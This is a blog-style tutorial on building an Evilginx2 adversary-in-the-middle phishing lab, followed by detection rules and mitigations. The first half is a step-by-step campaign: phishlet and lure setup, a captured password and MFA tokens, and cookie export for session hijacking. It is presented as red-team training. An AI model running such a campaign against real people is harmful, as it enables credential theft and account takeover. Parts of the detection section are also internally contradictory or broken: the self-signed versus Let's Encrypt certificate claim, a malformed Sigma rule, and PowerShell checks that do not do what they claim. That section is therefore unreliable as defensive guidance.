---
author: ["Anass"]
title: "From Evilginx2 to Session Hijacking: Building a Phishing Lab & Detection Rules"
date: "2026-02-18"
description: "A hands-on guide to setting up Evilginx2, executing AitM attacks, and building detection rules to identify session hijacking attempts."
tags: ["Evilginx2", "Session Hijacking", "AitM", "Phishing", "Red Team", "MITM"]
categories: ["Security", "Red Team", "Hands-On"]
ShowToc: true
---

Session hijacking has evolved beyond traditional cookie theft. With Adversary-in-the-Middle (AitM) phishing kits like Evilginx2, attackers can intercept credentials and session tokens in real-time, bypassing even strong MFA solutions. In this hands-on guide, we'll build a controlled lab environment, execute a full phishing campaign, and develop detection rules to identify these attacks.

### Understanding the Threat

Evilginx2 is a man-in-the-middle proxy framework that sits between the victim and the legitimate website. Unlike traditional phishing, it:

- **Intercepts in real-time**: Captures credentials AND session cookies
- **Bypasses MFA**: Captures the token after MFA is completed
- **Uses real SSL**: Presents valid certificates to both victim and target
- **Maintains session**: Victim stays logged in while attacker hijacks the session

### The Attack Flow

```
Victim --> [Evilginx2 Proxy] --> Legitimate Website
              ^                        ^
              |                        |
        Captures                 Returns
        credentials              real content
        + session
        cookies
```

---

### Lab Environment Setup

#### Requirements

- **Attacker**: Kali Linux with public IP (or VPN service)
- **Phishing server**: Ubuntu 20.04+ (can be VPS)
- **Target simulation**: Local Nextcloud/Office 365 instance

#### Installing Evilginx2

```bash
# Clone and build Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Or use the pre-built binary
wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-amd64
chmod +x evilginx-v3.3.0-linux-amd64
mv evilginx-v3.3.0-linux-amd64 evilginx2
```

#### Configuring DNS

You'll need a domain and configure DNS records:

```
Type: A     Name: login      Value: YOUR_VPS_IP
Type: NS    Name: phish      Value: login.yourdomain.com
```

---

### Setting Up the Phishing Campaign

#### Step 1: Initialize Evilginx2

```bash
# Start evilginx2
sudo ./evilginx2

# Configure your domain
config domain yourdomain.com
config ip YOUR_VPS_IP
```

#### Step 2: Create Phishing Site

```bash
# Enable HTTP listener on port 80
http on

# Get phishing templates (Office 365 example)
phishlets hostname o365 login.yourdomain.com
phishlets enable o365

# Or create custom - use Nextcloud as example
phishlets hostname nextcloud phish.yourdomain.com
phishlets enable nextcloud
```

#### Step 3: Generate Phishing Link

```bash
# Create the phishing URL
lures create o365
lures get-url 1

# Output example:
# https://login.yourdomain.com/auth/login?ref=companyname
```

#### Step 4: Launch the Phishing Page

```bash
# Start the phishlet
phishlets enable o365

# View active sessions
sessions
```

---

### Executing the Attack (Lab Simulation)

#### Simulating Victim Interaction

1. Send phishing link to victim (in lab, open it yourself)
2. Victim sees legitimate-looking login page
3. Victim enters credentials → captured by Evilginx2
4. Victim enters MFA token → also captured
5. Victim sees real 365 dashboard (proxied)
6. Attacker now has valid session cookie

#### Captured Data

In Evilginx2 console:

```
sessions

SESSION ID: a1b2c3d4e5f6
Username:  victim@company.com
Password:  MySecureP@ss123!
Tokens:    eyJ0eXAiOiJKV1Q...[JWT access token]
           eyJrt...[refresh token]
IP:        192.168.1.50
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
Created:   2025-02-18 10:30:00
```

#### Hijacking the Session

```bash
# Get session cookie
sessions -i a1b2c3d4e5f6

# Export cookie in various formats
sessions -i a1b2c3d4e5f6 --json
sessions -i a1b2c3d4e5f6 --cookie
sessions -i a1b2c3d4e5f6 --cookie-curl

# Use with browser
# Install "Cookie-Editor" extension
# Paste exported cookie
```

---

### Detection Strategies

#### Network-Level Detection

**1. SSL Certificate Analysis**

Evilginx2 uses self-signed certificates. Monitor for:

```bash
# Check certificate issuer differences
# Legitimate: *.microsoft.com ( DigiCert Inc )
# Phishing:  YourPhishingDomain ( Let's Encrypt )

# Zeek script to detect certificate anomalies
# Save as cert_anomaly.zeek

event ssl_established(c: connection)
{
    if (c$ssl?$server_cert)
    {
        local issuer = c$ssl$server_cert$issuer;
        local subject = c$ssl$server_cert$subject;
        
        # Alert if certificate doesn't match expected patterns
        if ( /cloudflare|akamai|fastly|azure|microsoft|google/ !in issuer$O )
        {
            print fmt("Suspicious SSL certificate: %s from %s", subject, c$id$orig_h);
        }
    }
}
```

**2. HTTP Traffic Analysis**

```bash
# Look for duplicate requests (proxy pattern)
# Evilginx forwards requests to real site AND logs them

# Zeek/Bro detection for request patterns
# Multiple identical paths from different source IPs = suspicious
```

#### Host-Level Detection

**1. Chrome DevTools Investigation**

Legitimate vs Phishing:

```javascript
// Check document URL vs actual domain
console.log('URL:', window.location.href);
console.log('Hostname:', window.location.hostname);

// Evilginx will show your phishing domain
// Real Microsoft: login.microsoftonline.com
// Phishing: login.yourdomain.com
```

**2. Certificate Pinning Check**

```powershell
# PowerShell to check certificate properties
$cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -match "microsoft"}
$cert | Format-List Subject, Issuer, Thumbprint
```

#### SIEM Detection Rules

**Sigma Rule - Suspicious Login Domain**

```yaml
title: AitM Phishing - Login Domain Mismatch
id: 2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e
status: experimental
description: Detects when login page domain doesn't match expected tenant
author: Your Name
date: 2025/02/18

logsource:
    category: proxy

detection:
    selection:
        url|contains: '/login'
        - referrer|contains: 'microsoftonline.com'
        - referrer|contains: 'office.com'
        - referrer|contains: 'login.microsoft.com'
    condition: selection

fields:
    - src_ip
    - url
    - user_agent
    - referrer

level: high
```

**Splunk Query - Session Token Extraction**

```spl
index=proxy sourcetype=zscaler_zia
| search url="/login" OR url="/auth/login"
| stats count by src_ip, url, user_agent
| where count > 10
| eval severity=if(count>50, "critical", "medium")
```

#### Browser Forensics

**Chrome Network Flags**

```powershell
# Check for proxy detection in Chrome
# Open DevTools > Network
# Look for requests to unusual domains

# Cookie inspection
# DevTools > Application > Cookies
# Check Domain column - should match expected site
```

---

### Mitigation Strategies

#### For Organizations

**1. Implement FIDO2/WebAuthn**

Phishing-resistant authentication:

```yaml
# Azure AD Conditional Access Policy
- Require phishing-resistant MFA
  - Supported: FIDO2, Windows Hello for Business, Certificate-based auth
  - Not supported: SMS, Voice, Email, Software OATH
```

**2. Token Binding**

```yaml
# Enable token binding in Azure AD
# Prevents stolen tokens from being used on different devices
```

**3. Session Monitoring**

```powershell
# Monitor for multiple sessions from different IPs
# Azure AD Sign-in Logs > Session ID analysis

Get-AzureAdSignInLogs -Filter "appDisplayName eq 'Office 365'" |
    Where-Object { $_.IPAddress -ne $_.PreviousSignInIPAddress } |
    Select-Object UserPrincipalName, IPAddress, Location, CreatedDateTime
```

**4. Network Segmentation**

```powershell
# Block direct connections to unknown IPs
# Force all traffic through proxy
# Implement Zero Trust Network Access (ZTNA)
```

#### For Individuals

**1. Check the URL Bar**

```
✓ Real: https://login.microsoftonline.com/...
✗ Fake: https://login.company-phish.com/...
✗ Fake: https://microsoft.login.yourdomain.com/...
```

**2. Verify Certificate**

Click lock icon → Check issuer → Verify organization name

**3. Use Browser Isolation**

```yaml
# Implement browser isolation for risky activities
# Remote browser isolation (RBI) solutions:
# - Authentic8
# - Talon
# - Ericom
```

**4. Check Session Properties**

Many services show "Active sessions" - check for unknown locations/IPs

---

### Conclusion

AitM attacks using Evilginx2 represent a paradigm shift in phishing. Traditional MFA solutions cannot stop an attacker who intercepts the session after authentication. The key defense is:

1. **Phishing-resistant authentication** (FIDO2/WebAuthn)
2. **Continuous session validation** (device posture, IP reputation)
3. **Network-level detection** (certificate anomalies, traffic patterns)
4. **User education** (URL verification, certificate checking)

Understanding how these attacks work is crucial for both red teamers and defenders. Build your lab, test the attack, and then build your detection rules.

---

**Lab Challenge**: 

1. Set up Evilginx2 with a test domain
2. Create a phishing page for a service (Nextcloud is great for learning)
3. Capture your own session
4. Write a detection rule that would catch your test
5. Implement one mitigation and verify it blocks the attack

---

**Sources:**

1. [Evilginx2 GitHub](https://github.com/kgretzky/evilginx2)
2. [AitM Attack Overview - Okta](https://sec.okta.com/articles/2023/08/mitm-aitm-attacks)
3. [Cloudflare - AitM Detection](https://blog.cloudflare.com/how-to-detect-adversary-in-the-middle-aitm-attacks/)
4. [MITRE ATT&CK - Phishing](https://attack.mitre.org/techniques/T1566/)
